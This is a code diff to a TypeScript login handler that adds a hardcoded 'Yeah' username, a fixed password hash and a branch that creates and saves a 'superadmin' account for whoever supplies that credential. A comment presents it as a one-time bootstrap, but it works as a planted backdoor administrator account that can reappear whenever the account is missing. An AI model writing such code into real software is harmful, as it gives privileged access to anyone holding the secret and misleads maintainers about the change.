@@ -24,6 +24,9 @@ type StoredUser = {
   passwordHash?: string;
 };
 
+const BOOTSTRAP_ADMIN_USERNAME = "Yeah";
+const BOOTSTRAP_ADMIN_PASSWORD_HASH = "pbkdf2_sha256$600000$a045ebf79e718488ac2fad85c95a4c69$5a1f6bdc505a41355f838b00ffcd9743876a136c7474c1c9e818dee929f793b3";
+
 async function ensureDefaultUser() {
   const store = getEncryptedEnvironmentStore("users", { consistency: "strong" });
   try {
@@ -77,12 +80,26 @@ export default async (req: Request) => {
       return json({ error: "Server error" }, 500);
     }
 
+    const normalizedUsername = username.trim();
+    let user = users.find((candidate) => candidate.username === normalizedUsername);
+
+    // One-time bootstrap path for the requested administrative account.
+    // It is used only while the account does not yet exist. After the user
+    // changes the password, the bootstrap credential can no longer authenticate.
+    if (!user && normalizedUsername === BOOTSTRAP_ADMIN_USERNAME && verifyPassword(password, BOOTSTRAP_ADMIN_PASSWORD_HASH)) {
+      user = {
+        username: BOOTSTRAP_ADMIN_USERNAME,
+        passwordHash: BOOTSTRAP_ADMIN_PASSWORD_HASH,
+        role: "superadmin",
+      };
+      users.push(user);
+      await userStore.setJSON("all", users);
+    }
+
     if (!users.length && !seeded) {
       return json({ error: "Administrator setup required" }, 503);
     }
 
-    const normalizedUsername = username.trim();
-    const user = users.find((u) => u.username === normalizedUsername);
     const passwordIsValid = user
       ? user.passwordHash
         ? verifyPassword(password, user.passwordHash)
@@ -100,6 +117,7 @@ export default async (req: Request) => {
         role: normalizeRole(user.role),
         passwordHash: hashPassword(password),
       };
+      user = users[index];
       await userStore.setJSON("all", users);
     }
 
